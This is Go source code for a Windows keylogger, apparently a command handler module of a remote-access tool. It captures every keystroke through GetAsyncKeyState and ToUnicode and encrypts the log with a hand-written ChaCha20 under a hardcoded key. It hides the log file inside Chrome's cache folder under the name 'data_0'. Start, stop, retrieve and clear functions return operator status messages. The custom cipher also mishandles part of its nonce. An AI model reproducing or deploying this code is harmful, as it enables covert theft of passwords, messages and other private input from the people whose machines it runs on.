package handlers

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	getKeyboardState = user32.NewProc("GetKeyboardState")
	mapVirtualKey    = user32.NewProc("MapVirtualKeyW")
	toUnicode        = user32.NewProc("ToUnicode")
)

const (
	mapVK = 2
)

// 32 bytes key, hardcoded...
var chachaKey = [32]byte{
	0x28, 0x38, 0x43, 0x2B, 0xBB, 0x53, 0xD8, 0x82,
	0x91, 0xA4, 0xC7, 0x6E, 0xF2, 0x35, 0x19, 0x8D,
	0x4A, 0xB6, 0x7C, 0x03, 0x9F, 0xE1, 0x58, 0x2D,
	0xD4, 0x76, 0x8B, 0xAA, 0x45, 0x92, 0xCE, 0x67,
}

type Keylogger struct {
	running      bool
	logFile      string
	buffer       strings.Builder
	sessionNonce [12]byte
}

// rlly basic implement
type chacha20Ctx struct {
	state [16]uint32
}

func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {
	a += b
	d ^= a
	d = (d << 16) | (d >> 16)
	c += d
	b ^= c
	b = (b << 12) | (b >> 20)
	a += b
	d ^= a
	d = (d << 8) | (d >> 24)
	c += d
	b ^= c
	b = (b << 7) | (b >> 25)
	return a, b, c, d
}

func newChaCha20(key *[32]byte, nonce *[12]byte, counter uint64) *chacha20Ctx {
	ctx := &chacha20Ctx{}

	// constants
	ctx.state[0] = 0x61707865
	ctx.state[1] = 0x3320646e
	ctx.state[2] = 0x79622d32
	ctx.state[3] = 0x6b206574

	// Key (256 bits = 8 words)
	for i := 0; i < 8; i++ {
		ctx.state[4+i] = binary.LittleEndian.Uint32(key[i*4 : (i+1)*4])
	}

	ctx.state[12] = uint32(counter)
	ctx.state[13] = uint32(counter >> 32)
	ctx.state[14] = binary.LittleEndian.Uint32(nonce[0:4])
	ctx.state[15] = binary.LittleEndian.Uint32(nonce[4:8])
	ctx.state[13] |= binary.LittleEndian.Uint32(nonce[8:12]) << 32

	return ctx
}

func (ctx *chacha20Ctx) getKeystream() [64]byte {
	workingState := ctx.state
	var keystream [64]byte

	// 20 rounds (10 double rounds)
	for i := 0; i < 10; i++ {
		// Column rounds
		workingState[0], workingState[4], workingState[8], workingState[12] = quarterRound(workingState[0], workingState[4], workingState[8], workingState[12])
		workingState[1], workingState[5], workingState[9], workingState[13] = quarterRound(workingState[1], workingState[5], workingState[9], workingState[13])
		workingState[2], workingState[6], workingState[10], workingState[14] = quarterRound(workingState[2], workingState[6], workingState[10], workingState[14])
		workingState[3], workingState[7], workingState[11], workingState[15] = quarterRound(workingState[3], workingState[7], workingState[11], workingState[15])

		// Diagonal rounds
		workingState[0], workingState[5], workingState[10], workingState[15] = quarterRound(workingState[0], workingState[5], workingState[10], workingState[15])
		workingState[1], workingState[6], workingState[11], workingState[12] = quarterRound(workingState[1], workingState[6], workingState[11], workingState[12])
		workingState[2], workingState[7], workingState[8], workingState[13] = quarterRound(workingState[2], workingState[7], workingState[8], workingState[13])
		workingState[3], workingState[4], workingState[9], workingState[14] = quarterRound(workingState[3], workingState[4], workingState[9], workingState[14])
	}

	for i := 0; i < 16; i++ {
		workingState[i] += ctx.state[i]
	}

	for i := 0; i < 16; i++ {
		binary.LittleEndian.PutUint32(keystream[i*4:(i+1)*4], workingState[i])
	}

	return keystream
}

func chacha20Encrypt(key *[32]byte, nonce *[12]byte, plaintext []byte) []byte {
	ciphertext := make([]byte, len(plaintext))
	counter := uint64(0)

	for i := 0; i < len(plaintext); i += 64 {
		ctx := newChaCha20(key, nonce, counter)
		keystream := ctx.getKeystream()

		blockSize := 64
		if i+blockSize > len(plaintext) {
			blockSize = len(plaintext) - i
		}

		for j := 0; j < blockSize; j++ {
			ciphertext[i+j] = plaintext[i+j] ^ keystream[j]
		}

		counter++
	}

	return ciphertext
}

func chacha20Decrypt(key *[32]byte, nonce *[12]byte, ciphertext []byte) []byte {
	// encrypt == decrypt
	return chacha20Encrypt(key, nonce, ciphertext)
}

func NewKeylogger() *Keylogger {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.TempDir()
	}

	logFile := filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Cache", "data_0")

	return &Keylogger{
		logFile: logFile,
		running: false,
	}
}

// GetAsyncKeyState wrapper
func GetAsyncKeyState(vKey int) bool {
	ret, _, _ := getAsyncKeyState.Call(uintptr(vKey))
	return ret&0x8000 != 0
}

// GetKeyboardState wrapper
func GetKeyboardState(lpKeyState *[256]byte) bool {
	ret, _, _ := getKeyboardState.Call(uintptr(unsafe.Pointer(lpKeyState)))
	return ret != 0
}

// MapVirtualKey wrapper
func MapVirtualKey(uCode uint, uMapType uint) uint {
	ret, _, _ := mapVirtualKey.Call(uintptr(uCode), uintptr(uMapType))
	return uint(ret)
}

// ToUnicode wrapper
func ToUnicode(wVirtKey uint, wScanCode uint, lpKeyState *[256]byte, pwszBuff *uint16, cchBuff int, wFlags uint) int {
	ret, _, _ := toUnicode.Call(
		uintptr(wVirtKey),
		uintptr(wScanCode),
		uintptr(unsafe.Pointer(lpKeyState)),
		uintptr(unsafe.Pointer(pwszBuff)),
		uintptr(cchBuff),
		uintptr(wFlags),
	)
	return int(ret)
}

func (kl *Keylogger) Start() string {
	if kl.running {
		return "⚠ Keylogger already running"
	}

	dir := filepath.Dir(kl.logFile)
	os.MkdirAll(dir, 0755)

	_, err := rand.Read(kl.sessionNonce[:])
	if err != nil {
		return fmt.Sprintf("❌ Error generating nonce: %v", err)
	}

	fileInfo, err := os.Stat(kl.logFile)
	isNewFile := os.IsNotExist(err) || (fileInfo != nil && fileInfo.Size() == 0)

	file, err := os.OpenFile(kl.logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Sprintf("❌ Error creating log file: %v", err)
	}

	if isNewFile {
		file.Write(kl.sessionNonce[:])
		file.Write([]byte{0x0A})
	}
	file.Close()

	kl.running = true

	go kl.keyloggerLoop()

	return "🔑 Keylogger started successfully"
}

func (kl *Keylogger) Stop() string {
	if !kl.running {
		return "⚠ Keylogger not running"
	}

	kl.running = false
	kl.flushBuffer()

	return "✅ Keylogger stopped"
}

func (kl *Keylogger) keyloggerLoop() {
	var keyState [256]byte
	var buffer [2]uint16

	for kl.running {
		for ascii := 8; ascii <= 254; ascii++ {
			if !kl.running {
				return
			}

			if GetAsyncKeyState(ascii) {
				if !GetKeyboardState(&keyState) {
					continue
				}

				virtualKey := MapVirtualKey(uint(ascii), mapVK)
				ret := ToUnicode(uint(ascii), uint(virtualKey), &keyState, &buffer[0], len(buffer), 0)

				if ret > 0 {
					runes := utf16.Decode(buffer[:ret])
					text := string(runes)
					kl.processKeystroke(text, ascii)
				}

				time.Sleep(40 * time.Millisecond)
			}
		}
		time.Sleep(40 * time.Millisecond)
	}
}

func (kl *Keylogger) processKeystroke(text string, keyCode int) {
	switch keyCode {
	case 8: // Backspace
		kl.buffer.WriteString("[BACKSPACE]")
	case 9: // Tab
		kl.buffer.WriteString("[TAB]")
	case 13: // Enter
		kl.buffer.WriteString("[ENTER]\n")
	case 32: // Space
		kl.buffer.WriteString(" ")
	case 37: // Left arrow
		kl.buffer.WriteString("[LEFT]")
	case 38: // Up arrow
		kl.buffer.WriteString("[UP]")
	case 39: // Right arrow
		kl.buffer.WriteString("[RIGHT]")
	case 40: // Down arrow
		kl.buffer.WriteString("[DOWN]")
	case 46: // Delete
		kl.buffer.WriteString("[DEL]")
	case 20: // Caps Lock
		kl.buffer.WriteString("[CAPS]")
	case 16, 17, 18: // Shift, Ctrl, Alt
    
		return
	default:
		kl.buffer.WriteString(text)
	}

	if kl.buffer.Len() >= 30 {
		kl.flushBuffer()
	}
}

func (kl *Keylogger) flushBuffer() {
	if kl.buffer.Len() == 0 {
		return
	}

	content := kl.buffer.String()
	kl.buffer.Reset()

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] %s", timestamp, content)

	encrypted := chacha20Encrypt(&chachaKey, &kl.sessionNonce, []byte(logEntry))

	file, err := os.OpenFile(kl.logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	length := uint32(len(encrypted))
	lengthBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(lengthBytes, length)

	file.Write(lengthBytes)
	file.Write(encrypted)
}

func (kl *Keylogger) GetLogs() (string, error) {
	kl.flushBuffer() 

	content, err := os.ReadFile(kl.logFile)
	if err != nil {
		return "", err
	}

	if len(content) < 13 { 
		return "", fmt.Errorf("empty log")
	}

	var fileNonce [12]byte
	copy(fileNonce[:], content[:12])

	content = content[13:]

	var decryptedLogs strings.Builder

	offset := 0
	for offset < len(content) {
		if offset+4 > len(content) {
			break
		}

		length := binary.LittleEndian.Uint32(content[offset : offset+4])
		offset += 4

		if offset+int(length) > len(content) {
			break
		}
    
		encrypted := content[offset : offset+int(length)]
		decrypted := chacha20Decrypt(&chachaKey, &fileNonce, encrypted)

		decryptedLogs.WriteString(string(decrypted))
		decryptedLogs.WriteString("\n")

		offset += int(length)
	}

	return decryptedLogs.String(), nil
}

func (kl *Keylogger) ClearLogs() error {
	kl.buffer.Reset()
	return os.Remove(kl.logFile)
}

func (kl *Keylogger) IsRunning() bool {
	return kl.running
}
